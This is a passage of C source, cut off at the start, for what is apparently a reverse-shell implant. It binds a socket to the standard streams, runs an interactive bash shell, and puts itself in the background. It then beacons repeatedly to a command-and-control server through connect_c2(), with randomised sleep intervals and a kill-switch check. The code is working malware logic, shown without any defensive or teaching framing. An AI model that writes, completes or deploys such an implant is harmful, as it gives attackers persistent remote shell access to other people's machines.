        close(sock);
        return -1;
    }

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execve("/bin/bash", (char *[]){"/bin/bash", "-i", NULL}, NULL);

    close(sock);
    return 0;
}

int main() {
    signal(SIGCHLD, SIG_IGN);
    daemonize();

    int retries = 0;
    while (retries < MAX_RETRIES) {
        if (check_kill_switch()) return 0;

        pid_t pid = fork();
        if (pid == 0) {
            connect_c2();
            exit(0);
        }
        waitpid(pid, NULL, 0);

        retries++;
        sleep(BEACON_INTERVAL + (rand() % 10));
    }

    return 0;
}
